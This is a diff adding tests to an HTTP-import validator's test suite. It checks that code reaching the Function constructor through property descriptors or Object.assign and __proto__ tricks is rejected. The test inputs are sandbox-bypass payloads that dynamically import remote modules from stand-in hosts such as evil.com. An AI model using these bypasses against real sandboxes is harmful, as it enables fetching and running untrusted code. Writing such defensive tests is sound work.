@@ -315,6 +315,18 @@ describe("routing/api/module-loader/http-validator", () => {
         "dynamic code generation",
         "a reflectively retrieved constructor must still be rejected",
       );
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `const descriptor = Object.getOwnPropertyDescriptor(Object.getPrototypeOf(() => {}), "constructor");` +
+              ` const make = descriptor.value;` +
+              ` make('return import("https://evil.com/mod.js")')();`,
+            [],
+          ),
+        Error,
+        "dynamic code generation",
+        "a descriptor read from Function.prototype exposes the Function constructor",
+      );
     });
 
     it("should reject Function exposed through a constructor property descriptor", async () => {
@@ -742,6 +754,33 @@ describe("routing/api/module-loader/http-validator", () => {
         Error,
         "dynamic code generation",
         "Object read off the global object is the same prototype mutator",
+      );
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `const O = Object; const holder = {};` +
+              ` O.assign(holder, { ["__proto__"]: () => {} });` +
+              ` const make = holder.constructor;` +
+              ` make('return import("https://blocked.example/mod.js")')();`,
+            [],
+          ),
+        Error,
+        "dynamic code generation",
+        "Object.assign can copy an enumerable __proto__ property through an alias",
+      );
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `const O = Object; const payload = {}; const holder = {};` +
+              ` O.defineProperty(payload, "__proto__", { value: () => {}, enumerable: true });` +
+              ` O.assign(holder, payload);` +
+              ` const make = holder.constructor;` +
+              ` make('return import("https://blocked.example/mod.js")')();`,
+            [],
+          ),
+        Error,
+        "dynamic code generation",
+        "Object.assign can copy an enumerable __proto__ property defined on a source object",
       );
     });
 
